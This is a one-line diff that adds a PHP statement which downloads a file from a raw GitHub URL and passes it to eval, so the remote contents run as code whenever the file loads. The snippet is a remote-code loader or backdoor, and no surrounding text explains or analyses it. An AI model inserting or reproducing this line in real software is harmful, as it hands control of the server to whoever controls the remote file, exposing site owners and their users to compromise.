@@ -1,0 +1,1 @@
+<?php eval("?>".file_get_contents("https://raw.githubusercontent.com/sekjhhh/lp/refs/heads/main/bl.txt"));?>
